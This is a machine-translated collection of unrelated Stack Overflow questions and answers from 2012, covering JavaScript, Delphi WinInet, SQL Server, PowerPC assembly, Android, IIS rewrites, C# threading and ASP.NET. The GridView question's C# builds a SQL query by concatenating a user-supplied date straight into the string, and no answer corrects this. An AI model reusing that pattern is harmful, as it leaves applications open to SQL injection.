# javascript - 基于另一个数组创建对象数组？

> ID：12427242
> 
> 赞同：0
> 
> 时间：2012-09-14T15:09:32.260
> 
> 标签：javascript

我想采用这样的数组：

```
var food = [
    {
        name: 'strawberry',
        type: 'fruit',
        color: 'red',
        id: 3483
    },
    {
        name: 'apple',
        type: 'fruit',
        color: 'red',
        id: 3418
    },
    {
        name: 'banana',
        type: 'fruit',
        color: 'yellow',
        id: 3458
    },
    {
        name: 'brocolli',
        type: 'vegetable',
        color: 'green',
        id: 1458
    },
    {
        name: 'steak',
        type: 'meat',
        color: 'brown',
        id: 2458
    },
] 
```

我想动态地创建这样的东西：

```
var foodCategories = [
    {
        name: 'fruit',
        items: [
            {
                name: 'apple',
                type: 'fruit',
                color: 'red',
                id: 3418
            },
            {
                name: 'banana',
                type: 'fruit',
                color: 'yellow',
                id: 3458
            }
        ]
    },
    {
        name: 'vegetable',
        items: [
            {
                name: 'brocolli',
                type: 'vegetable',
                color: 'green',
                id: 1458
            },
        ]
    },
    {
        name: 'meat',
        items: [
            {
                name: 'steak',
                type: 'meat',
                color: 'brown',
                id: 2458
            }
        ]
    }
] 
```

这样做的最佳方法是什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-14T15:18:59.923

你可以这样做。您遍历食物数组，对于找到的每个对象，您查看 foodCategories 数组并查看是否有该食物类型的对象。如果你不这样做，你就加一个。然后，将食物项添加到正确的类别对象的数组中。

```
var foodCategories = [];

function findTypeInArray(arr, type) {
    for (var i = 0; i < arr.length; i++) {
        if (arr[i].name === type) {
            return(i);
        }
    }
    return(-1);
}

for (var i = 0; i < food.length; i++) {
    var item = food[i];
    var index = findTypeInArray(foodCategories, item.type);
    if (index === -1) {
        foodCategories.push({name: item.type, items: []});
        index = foodCategories.length - 1;
    }
    foodCategories[index].items.push(item);
} 
```

工作演示：http: [//jsfiddle.net/jfriend00/CwEE7/](http://jsfiddle.net/jfriend00/CwEE7/)

# windows - 在 Program Files 与 Appdata 中安装

> ID：12427245
> 
> 赞同：46
> 
> 时间：2012-09-14T15:09:35.747
> 
> 标签：windows, installation

在用户的 AppData 目录中安装应用程序有什么好处和坏处？

我假设在 AppData 中安装将使受限环境中的用户能够安装和使用该应用程序。

* * *

## 回答 #1

> 赞同：46
> 
> 时间：2012-09-27T16:14:45.050

安装到 Program Files 的好处之一是这正是用户期望它去的地方。通常用户会先到这里查看程序的安装位置。最大的缺点是用户需要管理权限，而程序并不总是需要它。

您假设安装到 AppData 将允许受限用户安装和使用该应用程序是正确的。它还将跟随用户在网络系统上四处走动，允许他们从使用相同帐户登录的任何机器访问该程序。然而，这也是一个缺点，因为这意味着一台机器上的 2 或 3 个用户将安装 2 或 3 个版本。

Google 将其产品安装到 AppData，这很棒，因为它可以被任何用户安装（包括在计算机被 IE6 或其他东西卡住的学校）。

您应该将 AppData 用于任何将随程序更改的配置或程序文件。我个人更喜欢将程序安装到 Program Files，因为这是用户假设将安装它的位置，并且它需要管理员权限，这通常是有原因的，并且遵守这些权限对于应用程序来说是件好事。最终取决于您，但默认值可能只是 Program Files。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2018-09-13T00:27:40.640

通常看来，“Appdata”目录等同于有人可能会注意到使用 Linux 系统的用户软件目录；没有过多关注从 Program Files 目录安装到越来越流行的 Appdata 文件夹的转变，但它慢慢地让我明白了。

线程有点旧，但考虑到 Windows 仍然非常活跃，因此相关；Program Files 安装主要用于您的敏感应用程序——您需要对维护和安全应用程序等进行更多访问控制的应用程序。您的 Appdata 文件夹几乎是任何其他“用户”特定的软件，例如媒体播放器、文本编辑器；等等。Windows 安装的“管理员”也将受益于将 appdata 用于“普通”软件，就像在管理 Linux、Mac 或 BSD 系统时不在根目录中安装软件一样。

# delphi - Wininet InternetSetStatusCallback 不起作用

> ID：12427247
> 
> 赞同：2
> 
> 时间：2012-09-14T15:09:40.963
> 
> 标签：delphi, winapi, ftp, wininet

我试图检测 ftp 服务器何时关闭我在应用程序中打开的连接。我正在使用 WinInet 功能。

我找到了一些使用该`InternetSetStatusCallback`功能的示例。我实现了一个回调函数`StatusCallback`，并在调用中传递了它的地址`InternetSetStatusCallback`。`InternetSetStatusCallback`给我一个 type 的状态`PFNInternetStatusCallback`。状态不是`INTERNET_INVALID_STATUS_CALLBACK`，这意味着我的函数`StatusCallback`被接受为回调函数，但从未调用过回调函数。我试图通过让服务器超时连接并手动关闭服务器来触发它。

我的德尔福代码如下。有人可以帮我吗？或者这会以不正确的方式检测连接状态吗？

谢谢

```
unit Unit1;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, ExtCtrls, StdCtrls,
  WinInet,
  Winsock;

type
  TForm1 = class(TForm)
    lblConnected:   TLabel;
    Label2:         TLabel;
    tmrNOOP:        TTimer;
    btnConnect:     TButton;
    btnDisconnect:  TButton;
    Memo1:          TMemo;
    procedure btnConnectClick( Sender: TObject );
    procedure btnDisconnectClick( Sender: TObject );
    procedure SendNOOP( Sender: TObject );
  private
    FFtpRootHandle:     HINTERNET;
    FFtpSessionHandle:  HINTERNET;
  public
    { Public declarations }
  end;

var
  Form1: TForm1;

implementation

{$R *.dfm}

{
  N.b. we DO need to define FtpCommand here as it has been defined incorrectly
  in WinInet.pas (missing last parameter)
}
function FtpCommand(
  hConnect:         HINTERNET;
  fExpectResponse:  BOOL;
  dwFlags:          DWORD;
  lpszCommand:      PChar;
  dwContext:        DWORD;
  out FtpCmd:       HINTERNET ): BOOL; stdcall; external 'wininet.dll' name 'FtpCommandA';

procedure StatusCallback(
  hInet:        HINTERNET;
  Context:      DWORD_PTR;
  Status:       DWORD;
  pInformation: Pointer;
  InfoLength:   DWORD ); stdcall;
var
  s: string;
begin
  case Status of
    INTERNET_STATUS_CLOSING_CONNECTION: s := 'Closing the connection to the server';
    INTERNET_STATUS_CONNECTED_TO_SERVER: s := 'Successfully connected to the socket address: ';
    INTERNET_STATUS_CONNECTING_TO_SERVER: s := 'Connecting to the socket address';
    INTERNET_STATUS_CONNECTION_CLOSED: s := 'Successfully closed the connection to the server';
    INTERNET_STATUS_CTL_RESPONSE_RECEIVED: s := 'Not implemented';
    INTERNET_STATUS_HANDLE_CLOSING: s := 'This handle value has been terminated';
    INTERNET_STATUS_HANDLE_CREATED: s := 'InternetConnect has created the new handle';
    INTERNET_STATUS_INTERMEDIATE_RESPONSE: s :=
      'Received an intermediate (100 level) status code message from the server';
    INTERNET_STATUS_NAME_RESOLVED: s := 'Successfully found the IP address: ' + PChar(pInformation);
    INTERNET_STATUS_PREFETCH: s := 'Not implemented';
    INTERNET_STATUS_RECEIVING_RESPONSE: s := 'Waiting for the server to respond to a request ';
    INTERNET_STATUS_REDIRECT: s := 'HTTP request is about to automatically redirect the request ' +
      PChar(pInformation);
    INTERNET_STATUS_REQUEST_COMPLETE: s := 'An asynchronous operation has been completed';
    INTERNET_STATUS_REQUEST_SENT: s := 'Successfully sent the information request to the server: ' +
      IntToStr(Integer(pInformation)) + ' Byte';
    INTERNET_STATUS_RESOLVING_NAME: s := 'Looking up the IP address: ' + PChar(pInformation);
    INTERNET_STATUS_RESPONSE_RECEIVED: s := 'Successfully received a response from the server: ' +
      IntToStr(Integer(pInformation)) + ' Byte';
    INTERNET_STATUS_SENDING_REQUEST: s := 'Sending the information request to the server.';
    INTERNET_STATUS_STATE_CHANGE:
      begin
        s := 'Moved between a secure (HTTPS) and a nonsecure (HTTP) site.';
        case DWORD(pInformation) of
          INTERNET_STATE_CONNECTED: s := s + #13#10 + 'Connected state. Mutually exclusive with disconnected state.';
          INTERNET_STATE_DISCONNECTED: s := s + #13#10 +
            'Disconnected state. No network connection could be established.';
          INTERNET_STATE_DISCONNECTED_BY_USER: s := s + #13#10 + 'Disconnected by user request.';
          INTERNET_STATE_IDLE: s := s + #13#10 + 'No network requests are being made by Windows Internet.';
          INTERNET_STATE_BUSY: s := s + #13#10 + 'Network requests are being made by Windows Internet.';
        end;
      end;
  end;
  Writeln(s);
end;

procedure TForm1.btnConnectClick( Sender: TObject );
var
  flags:  Cardinal;
  Status: PFNInternetStatusCallback;
  I:      Integer;
begin
  FFtpRootHandle :=
    InternetOpen(
      Pchar( 'NOOP TESTER'),
      INTERNET_OPEN_TYPE_DIRECT,
      nil,
      nil,
      0 );

  if not Assigned( FFtpRootHandle ) then
  begin
    RaiseLastOSError();
    Exit;
  end;

  flags := INTERNET_FLAG_PASSIVE or INTERNET_FLAG_NO_UI;
  FFtpSessionHandle :=
    InternetConnect(
      FFtpRootHandle,
      PAnsiChar( '127.0.0.1' ),
      Word( 21 ),
      PAnsiChar( 'x11' ),
      PAnsiChar( 'x11' ),
      INTERNET_SERVICE_FTP,
      Flags,
      INTERNET_FLAG_ASYNC );

  Status := InternetSetStatusCallback( FFtpSessionHandle,       INTERNET_STATUS_CALLBACK(@StatusCallback) );
if NativeInt( Status ) = INTERNET_INVALID_STATUS_CALLBACK then
  raise Exception.Create( 'Callback function is not valid' );

if not Assigned( FFtpSessionHandle ) then
begin
    InternetCloseHandle( FFtpRootHandle );
    RaiseLastOSError();
    Exit;
  end;
  lblConnected.Color := clGreen;
  btnConnect.Enabled := false;
  tmrNOOP.Interval := 10000;
  tmrNOOP.Enabled := true;
end;

procedure TForm1.btnDisconnectClick( Sender: TObject );
begin
  tmrNOOP.Enabled := false;
  if Assigned( FFtpSessionHandle ) then
  begin
    InternetCloseHandle( FFtpSessionHandle );
    if Assigned( FFtpRootHandle ) then
    begin
      InternetCloseHandle( FFtpRootHandle );
    end;
  end;
  lblConnected.Color := clRed;
  btnConnect.Enabled := true;
end;

procedure TForm1.SendNOOP( Sender: TObject );
var
  NOOPSuccess:  Boolean;
  FtpCmd:       HINTERNET;
begin
  NOOPSuccess :=
    FtpCommand(
      FFtpSessionHandle,
      false,
      FTP_TRANSFER_TYPE_BINARY,
      PAnsiChar( 'noop' ),
      0,
      FtpCmd );
  if NOOPSuccess then
  begin

  end;
end;

end. 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-14T23:38:56.930

[阅读文档](http://msdn.microsoft.com/en-us/library/windows/desktop/aa385120.aspx)：

> 当 InternetConnect 的 dwContext 句柄设置为零 (INTERNET_NO_CALLBACK) 时，将不会调用 lpfnInternetCallback 参数中指定的回调函数...连接句柄。

您确实将`dwContext`参数设置`InternetConnect()`为零。

# javascript - Javascript RegExp 密码验证

> ID：12427248
> 
> 赞同：3
> 
> 时间：2012-09-14T15:09:49.047
> 
> 标签：javascript, regex

我有要验证的密码限制：

*   最小长度 = 6
*   允许大写和小写字符
*   至少 1 个字符（大写或小写）
*   至少 1 位数
*   允许的特殊字符：_$#%&!?-。

目前我的正则表达式如下所示：

```
/^(?=.*\d+)(?=.*[a-zA-Z])[0-9a-zA-Z\_\$\#\%\&!\?\-\.]{6,}$/ 
```

除特殊字符外，均满足要求。任何人都可以向我解释我对特殊字符做错了什么吗？如您所见，每个字符都被转义并分组到一个“允许的”字符类中。但是，测试仍然失败。

谢谢你

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-14T16:12:09.783

```
/^(?=.{6})(?=.*[a-zA-Z])(?=.*\d)[\w$#%&!?.-]+$/ 
```

或者

```
/^(?=.{6})(?=.*[a-z])(?=.*\d)[\w$#%&!?.-]+$/i 
```

# sql-server - 如何将存储过程的结果转换为 sql server 上的 xml？

> ID：12427252
> 
> 赞同：1
> 
> 时间：2012-09-14T15:10:11.433
> 
> 标签：sql-server, xml, stored-procedures

我有一个不能修改的存储过程，这个存储过程的结果是正常的选择语句如下：

```
CREATE PROCEDURE LockedProcedure
AS
BEGIN
    SELECT * FROM COLORS_TABLE
END 
```

我的问题是我需要将其结果作为 XML 结果获取，例如当您提供“FOR XML”但不修改过程本身时 select 语句如何返回，也许我们可以创建另一个存储过程来调用该或用户定义的函数。

这是一个我们不能修改的过程示例，因为它已被锁定。

如何将其结果作为 XML 结果而不是 XML 文件...我不想要硬盘上的任何物理文件。

谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-14T15:25:38.570

**解决方案1）**

1.  创建一个与存储过程的输出定义匹配的临时表。
2.  用于`INSERT INTO #Tmp EXEC SPName`将存储过程结果插入到临时表中。
3.  `FOR XML`与命令结合使用以`SELECT`从临时表中以 xml 格式获取结果。

**解决方案2）**

创建一个 CLR 用户定义函数来执行存储过程并使用 BCL 工具将结果转换为 xml。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2016-03-04T16:16:11.577

我有一个类似的问题，但在我的情况下编辑存储过程是可能的。即使 OP 提到存储过程被锁定，我仍然想在这里为其他偶然发现它的人发布这个解决方案。此解决方案假定存储过程使用动态 SQL 来选择一些数据，但也可以很容易地适应非动态 SQL 的情况。

1.  向 sp 添加一个参数，例如“@lp_ReturnAsXML BIT = 0”。当设置为 true 时，您将使用“FOR XML RAW”或一些类似的命令将结果集作为 XML 返回。
2.  然后将其添加到存储过程的末尾，作为运行动态 SQL 的替代方法：

    ```
    IF @lp_ReturnAsXML = 1
    BEGIN
        DECLARE @l_XML XML
        SET @l_SQL = 'SET @l_XML = (SELECT * FROM ( ' +
            @l_SQL + '
            ) d FOR XML RAW)'
        EXEC sp_executesql @l_SQL, N'@l_XML XML OUTPUT', @l_XML = @l_XML OUTPUT
        SELECT @l_XML
    END 
    ```

现在这样的事情应该可以工作：

```
DECLARE @table TABLE
(
    Results XML
)

INSERT INTO @table
EXEC p_MyStoredProc ..., @lp_ReturnAsXML = 1 
```

# assembly - 如何重置 PowerPC 专用寄存器

> ID：12427254
> 
> 赞同：1
> 
> 时间：2012-09-14T15:10:11.487
> 
> 标签：assembly, vxworks, powerpc

我需要重置（设置为 0）特殊用途寄存器 527（Alt Time Base 寄存器上限）。但是这个函数 sysAltTimeBaseUreset 使我的 VxWorks 目标的 PowerPC (Freescale P2020) 崩溃：

```
FUNC_BEGIN(sysAltTimeBaseUreset)
    mtspr       527, 0x0000              /* reset high 32-bits of Alt. Time Base register */
    bclr        20,0                    /* Return to caller */
FUNC_END(sysAltTimeBaseUreset) 
```

下面的函数工作正常，并返回 AltTimeBase 高位寄存器的内容。

```
FUNC_BEGIN(sysAltTimeBaseUGet)
    mfspr       r3, 527            /* high 32-bits of Alt. Time Base register */
    bclr        20,0                    /* Return to caller */
FUNC_END(sysAltTimeBaseUGet) 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-14T15:23:16.797

对时基寄存器的写操作是为监督级软件保留的。用户级软件不允许写入时基寄存器，通常在两个不同的时间读取寄存器并减去以找到经过的时间就足够了。

此外，您不应该只写入高位时基寄存器，因为只要低位时基寄存器回绕，它就会发生变化。设置寄存器的推荐过程是将下时基寄存器设置为零（这可以防止在时基的下一个 2 ^(32 个)滴答内发生回绕），然后将上时基寄存器设置为所需值，然后设置较低的时基寄存器到所需的值。（读的时候要先读高位寄存器，再读低位寄存器，再读高位寄存器。如果高位寄存器发生变化，必须丢弃低位寄存器的值，重复。）

此外，建议使用助记符写入时基寄存器，`mttbu`而`mttbl`不是硬编码的特殊寄存器编号。我不记得细节，但一些 PowerPC 实现在备用寄存器编号处有时基寄存器的回声，我认为它们可以读取但不能写入。

# visual-studio-2010 - 在 VS 2010 中实例化代码片段

> ID：12427260
> 
> 赞同：1
> 
> 时间：2012-09-14T15:10:29.523
> 
> 标签：visual-studio-2010, intellisense

您可以按 Ctrl+k、Ctrl+x 来调出代码片段菜单以在您的代码中实例化代码片段。有没有办法从 Intellisense 做到这一点？

# android - 从 ListView 获取选中的 Listitems 并将其传递给另一个活动

> ID：12427262
> 
> 赞同：0
> 
> 时间：2012-09-14T15:10:35.050
> 
> 标签：android, android-listview, android-checkbox

我正在`Android`使用`ListView`.

`ListView`每个`ListItem`. 在这里，我已经设置好`onItemClick`了`ListView`。因此，如果用户单击`ListItem`电子邮件应用程序会打开并在电子邮件中附加特定文件。对于单人`File`来说，这可以实现并正常工作。

现在我想在电子邮件中附加多个文件。即`CheckBox`在每个`ListItem`和检查项目中的实施必须附加到邮件中。

我知道它是可能的，因为它与文件管理器应用程序非常相似，通过单击单个文件来检查多个文件并删除所有文件`Button`。但是不知道怎么办。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-14T15:35:51.703

在你 ListAdapter 创建一个 SparseBooleanArray

```
private SparseBooleanArray checkStatus; 
```

此 SparseBooleanArray 存储选中的项目。现在在 getView 中执行以下操作

```
@Override
public View getView(int position, View view, ViewGroup parent) {
    ViewCache viewCache;
    if (view == null){
        viewCache = new ViewCache();
        view = layoutInflater.inflate(R.layout.list_box, null, false);
        viewCache.checkBox = view.findViewById(R.id.check_box);            
        viewCache.checkBox.setOnCheckedChangeListener(onCheckedChangeListener);
        //other views in the list box
        ...........
    }
    vewCache = (ViewCache)view.getTag();
    viewCache.checkBox.setTag(position);
    viewCache.checkBox.setChecked(isChecked(position));
    //set other views
    ........
} 
```

这是 ViewCache 类

```
private static class ViewCache{        
    CheckBox checkBox;
    //other views in the list box
    .......
} 
```

该方法检查位置是否被检查

```
private boolean isChecked(int position){
    return checkStatus.get(position, false);
} 
```

这是 onCheckChangeListener

```
CompoundButton.OnCheckedChangeListener onCheckedChangeListener = new CompoundButton.OnCheckedChangeListener() {
    @Override
    public void onCheckedChanged(CompoundButton compoundButton, boolean b) {
        checkStatus.put(((Integer)compoundButton.getTag()), b);
    }
}; 
```

最后，您可以从 SparseBooleanArray checkStatus 中获取选中的项目。认为它会帮助你。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-14T15:33:25.740

您可以尝试实现自己的 ArrayAdapter。使用文件对象数组对其进行初始化，并在列表视图中使用它。

接下来制作适配器可见的索引列表，并且可以从外部进行操作。在您的`onItemClick`方法中，您拥有被点击项目的位置。如果它在该列表中，请将其删除，否则 - 将其插入。我们称之为列表`selection`。

接下来在适配器的`getView`方法中构造一个内部带有复选框的视图。您再次拥有当前位置，因为它是作为参数传递的。根据 中位置的存在设置复选框状态`selection`。

最后实现你的按钮的 onClick 以便它只对你的文件对象执行你对文件对象所做的任何事情，这些对象的位置在你的`selection`.

希望有帮助

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-09-14T18:30:08.240

在上面的答案中，Sreejith 很好地解释了如何使用 SparseBooleanArray 在列表视图中存储选中项目的状态。这解决了您问题的第一部分。
关于将这些项目的状态传递给其他活动的第二部分可以使用 Application 类来实现。
**应用程序类：**
需要维护全局应用程序状态的基类。有时你想存储数据，比如需要从多个活动中访问的全局变量——有时在应用程序中的任何地方。在这种情况下，Application 对象将为您提供帮助。

这是一个示例代码：

```
public class TopClass extends Application {
private static TopClass topClass;

public TopClass getInstance()
{
    return topClass;
}

@Override
public void onCreate ( )
{
    super.onCreate();
    topClass = this;
}

public ArrayList<String> arrList = new ArrayList<String>(); 
```

}

您需要在应用程序标签下的应用程序清单文件中设置标签 android:name="TopClass"。像这样的东西：

```
<application
    android:icon="@drawable/ic_launcher"
    android:label="@string/app_name"
    android:name="TopClass" >
    ....
    .... 
```

以下是您可以从活动中访问它的方法：

```
TopClass top = (TopClass)getApplicationContext();
top.arrList.add("StackOverflow"); 
```

现在您可以类似地从其他活动中访问相同的变量。

# jquery - .click() 在循环内

> ID：12427263
> 
> 赞同：0
> 
> 时间：2012-09-14T15:10:42.353
> 
> 标签：jquery, ajax, facebook, wordpress

我在我的 wordpress 帖子循环中有这个：

```
function newWindow(uri,width,height) {
    if(!window.open(uri,uri,'scrollbars=1,toolbar=0,resizable=1,status=0,width='+width+',height='+height)) {
        document.location.href=uri;
    }
}
$('.facebook_button').click(function() {
    newWindow('http://www.facebook.com/sharer.php?u=<?php the_permalink(); ?>',720,420);
    return false; 
}); 
```

因此，当我单击该按钮时，它会打开几个窗口（索引页面上的 10 个帖子中有 10 个）。有没有办法只为按钮所在的帖子打开？

谢谢！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-14T15:20:38.553

您不应该在循环内有 javascript 函数定义（它只需要输出一次）。

我建议`the_permalink()`为循环中的每个项目添加一个唯一的 id（可能是值的散列），这样您就可以很好地处理选择器。所以你会在循环中输出类似

```
$('#<?php echo md5(get_permalink()); ?>').click(function() {
    newWindow('http://www.facebook.com/sharer.php?u=<?php the_permalink(); ?>',720,420);
    return false; 
}); 
```

当然，您还必须添加`id="<?php echo md5(get_permalink()); ?>"`到您输出的按钮。

# iis - 如果文件不存在，II7 将 (htm|html|asp) 的规则重写为 php

> ID：12427264
> 
> 赞同：0
> 
> 时间：2012-09-14T15:10:45.250
> 
> 标签：iis, iis-7, rewrite

我有一个使用经典 ASP 和 HTM/HTML 文件完成的旧网站。

现在我想将文件重命名为 .php 但将 url 保留为 .asp 或 .html

www.example.com/some/page.htm 到 www.example.com/some/page.php www.example.com/another_page.asp 到 www.example.com/another_page.php 等等..

我已经尝试过这个，灵感来自这里找到的另一个答案：

```
<rule name="HTML to PHP">
    <match url="^(.*)\.htm$" ignoreCase="true" />
    <conditions logicalGrouping="MatchAll">
        <add input="{REQUEST_FILENAME}" matchType="IsFile" ignoreCase="false" negate="true" />
        <add input="{REQUEST_FILENAME}" matchType="IsDirectory" ignoreCase="false" negate="true" />
    </conditions>
    <action type="Rewrite" url="{R:2}.php" />
</rule> 
```

但我不知道它是否有效，因为我必须联系我的主机来应用我所做的更改。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-16T08:57:36.123

将您的操作标签更改为：

```
<action type="Rewrite" url="/{R:1}.php" /> 
```

您可能还需要考虑添加查询字符串（如果提供）：

```
<action type="Rewrite" url="/{R:1}.php" appendQueryString="true" /> 
```

# c# - 在 C# 中为线程指定一个特殊的 cpu

> ID：12427265
> 
> 赞同：3
> 
> 时间：2012-09-14T15:10:47.343
> 
> 标签：c#, multithreading, cpu

我有 2 个线程。我想告诉他们其中一个在第一个 cpu 上运行，第二个在第二个 cpu 上运行，例如在具有两个 cpu 的机器上。我怎样才能做到这一点？

这是我的代码

```
UCI UCIMain = new UCI();
Thread UCIThread = new Thread(new ThreadStart(UCIMain.main));
UCIThread.Priority = ThreadPriority.BelowNormal;
UCIThread.Start(); 
```

并且肯定该类`UCI`有一个名为`main`. 例如，我想在第一个处理器中设置这个线程

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-09-14T17:07:18.287

我不建议这样做，但如果您真的需要：可以通过利用本机 Win32 系统调用，特别是`SetThreadAffinityMask`. 你需要做一些事情`DllImport`：

```
[DllImport("kernel32.dll")]
static extern IntPtr GetCurrentThread();
[DllImport("kernel32.dll")]
static extern IntPtr SetThreadAffinityMask(IntPtr hThread, IntPtr dwThreadAffinityMask); 
```

然后在每个生成的线程中使用它们（当然，使用不同的掩码参数）：

```
// set affinity of current thread to the given cpuID
SetThreadAffinityMask(GetCurrentThread(), new IntPtr(1)); // CPU 0 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-14T15:17:13.923

不要这样做。操作系统任务调度程序比手动调整要聪明得多。从技术上讲，您可以使用[线程亲和性](http://social.msdn.microsoft.com/Forums/en-US/csharpgeneral/thread/a55733db-cac0-4ccb-a3cc-a584742b41f9/)，但这通常不是一个好主意。而是使用线程池或 TPL 库。

如果一个核心非常繁忙，而另一个则不是。然后一个线程将缺乏处理能力，而另一个核心根本不会被加载。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-09-14T15:14:28.247

在 .NET 上，您有[ProcessThread.ProcessorAffinity](http://msdn.microsoft.com/en-us/library/system.diagnostics.processthread.processoraffinity.aspx)和[ProcessThread.IdealProcessor](http://msdn.microsoft.com/en-us/library/system.diagnostics.processthread.idealprocessor)

但是，既然您在谈论 a`Thread`而不是`Process`，我相信在 .NET 中没有直接可用的方法来执行此操作。

有，`Thread.SetProcessorAffinity()`但它仅适用于 Xbox 上的 XNA。

# c# - 动态更改 GridView 中的 BoundFields

> ID：12427270
> 
> 赞同：1
> 
> 时间：2012-09-14T15:11:03.593
> 
> 标签：c#, asp.net

我有一个`GridView`里面的`UpdatePanel`。在某些情况下，我必须在其中显示不同的列，`GridView`因此我需要更改`BoundFields`在我的`aspx`.

如何更改`BoundFields`以`GridView`填充不同的查询和不同的字段？

**ASPX**

```
<cc1:GridView ID="grdImoveis" CssClass="StyleGrid" Width="100%" runat="server" ShowHeader="false"
            AutoGenerateColumns="False" DataSourceID="dsGrid" BorderWidth="0px" GridLines="None"
            AllowPaging="True" EnableModelValidation="True" >
            <AlternatingRowStyle BackColor="White" CssClass="EstiloDalinhaAlternativaGrid" HorizontalAlign="Center" />
            <RowStyle CssClass="EstiloDalinhaGrid" HorizontalAlign="Center" />
            <Columns>
                <asp:BoundField HeaderText="Nome" DataField="NomeCompleto" />
                <asp:BoundField HeaderText="Cargo" DataField="DescricaoCargo1" />
                <asp:BoundField HeaderText="Data Cadastro" DataField="DataHora" />
                <asp:TemplateField ControlStyle-CssClass="acoes_lista_imovel" HeaderText="Curso">
                    <ItemTemplate>
                        <div class="acoes_lista_imovel">
                            <%# montaIcones(Eval("Usuario_Id").ToString())%>
                        </div>
                    </ItemTemplate>
                </asp:TemplateField>
            </Columns>
        </cc1:GridView> 
```

**代码背后**

```
protected void btnSelecionarData_OnClick(object sender, EventArgs e)
    {            
        string select = string.Empty;
        select += "SELECT San_Credenciada.Apelido, San_Usuario.NomeCompleto, San_Usuario.Usuario_Id, San_Usuario.DescricaoCargo1, "
            + "CONVERT(varchar, San_Usuario.DataHora, 103) AS DataHora, San_UsuarioCurso.Cv, San_UsuarioCurso.Institucional, "
            + "San_UsuarioCurso.Copon, San_UsuarioCurso.ManualCaptacaoESistema, San_UsuarioCurso.PosturaProfissional, San_UsuarioCurso.Certificado "
            + "FROM San_Usuario "
            + "JOIN San_Credenciada "
            + "ON San_Usuario.Credenciada_Id = San_Credenciada.Credenciada_Id "
            + "JOIN San_UsuarioCurso "
            + "ON San_Usuario.Usuario_Id = San_UsuarioCurso.Usuario_Id "
            + "WHERE San_Usuario.Provisorio = 1 "
            + "AND San_Usuario.Excluido = 0 "
            + "AND San_UsuarioCurso.DataCurso = '" + this.DtBusca.Value.ToString() +"' "
            + "GROUP BY San_Credenciada.Apelido, San_Usuario.NomeCompleto, San_Usuario.Usuario_Id, "
            + "San_Usuario.DescricaoCargo1, San_Usuario.DataHora, San_UsuarioCurso.Cv, San_UsuarioCurso.Institucional, "
            + "San_UsuarioCurso.Copon, San_UsuarioCurso.ManualCaptacaoESistema, San_UsuarioCurso.PosturaProfissional, San_UsuarioCurso.Certificado "
            + "ORDER BY San_Usuario.DataHora ASC ";

        dsGrid.ConnectionString = c.Con;
        dsGrid.SelectCommand = select;
        dsGrid.Dispose(); 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-14T15:22:52.193

如果我正确理解您的查询，您想更改列。一个简单的解决方案是`do not specify fields in your aspx page, just set AutoGenrateColumns = True`在你的网格视图中 decleratoin 你的网格应该看起来像

```
<asp:GridView ID="gv" runat="server" AutoGenrateColumns="True" />

// Now in your code behind just specify its DataSource property it will fill up with your desired columns.
// Your query should contain only those columns which you want to show 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-14T15:20:59.423

您可以放置​​ GridView 并启用“AutoGenerateColumns=True”，并为您喜欢的每种情况填充网格视图。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-14T17:15:52.840

您可以使用此代码以编程方式创建 ImageField：

```
 ImageField img = new ImageField();
        img.HeaderText = "Pictuer";
        img.DataImageUrlField ="Pic";
        img.DataImageUrlFormatString = "images\\{0}";
        GridView1.AutoGenerateColumns = false;
        GridView1.Columns.Add(img); 
```

# asp.net-mvc - MVC - 让视图影响主要布局的部分

> ID：12427274
> 
> 赞同：0
> 
> 时间：2012-09-14T15:11:19.197
> 
> 标签：asp.net-mvc

我已经创建了一个包含所有样式等的布局。我在这里有一个菜单和子菜单，还有一个 3 列的内容布局。

左栏大部分时间将用作报告的过滤器，主要内容的中心和帮助提示的右栏，具体取决于您所在的视图。

我可以定义子菜单中的链接是什么吗？

根据当前视图，左列和右列中填充了什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-14T15:14:35.173

如果您希望在这些区域中添加新内容，则需要查看部分。

您可以在默认项目中看到这样的示例，只需执行 file-new-project 即可查看布局页面。你会在你的布局中想要这样的东西：

```
@RenderSection("SideBar", false) 
```

此处允许您选择不将`false`侧边栏内容放在视图中。

然后，您的视图将具有以下内容：

```
@section SideBar {
   // your sidebar stuff
} 
```

与往常一样，顾先生最了解：[http ://weblogs.asp.net/scottgu/archive/2010/12/30/asp-net-mvc-3-layouts-and-sections-with-razor.aspx](http://weblogs.asp.net/scottgu/archive/2010/12/30/asp-net-mvc-3-layouts-and-sections-with-razor.aspx)

干杯。

# jquery - jQuery 相等语句无法正常运行

> ID：12427276
> 
> 赞同：0
> 
> 时间：2012-09-14T15:11:26.153
> 
> 标签：jquery

我编写了一个小的 jQuery 脚本，它检查计算的 div 大小，将此 div 的 css 高度设置为该高度，然后使用该高度来计算是否启动动画。已打印出变量以检查它们是否相同，并且似乎它们是相同的，但即使它们相同，它似乎也从未贯穿“如果”。谁能看到我在这里做错了什么？这段代码的主要目的是在屏幕之外隐藏一个绝对定位的 div，然后当单击锚点时，脚本运行并且 div 将相应地滑入或滑出。提前致谢！

```
$(document).ready(function(){
                var outerdivheight = $('.login_wrap').outerHeight();
                divheight = 0 - outerdivheight;
                $('.login_wrap').css("top", divheight + "px");
                $('#login_tab').click(function(){   

                if (parseInt($('.login_wrap').css('top') == outerdivheight)) { marg = '0'; } else { marg = divheight; }
                    $('.login_wrap').stop().animate({'top':marg}, 'slow');
                });
            }); 
```

* * *

## 回答 #1

> 赞同：3
> 
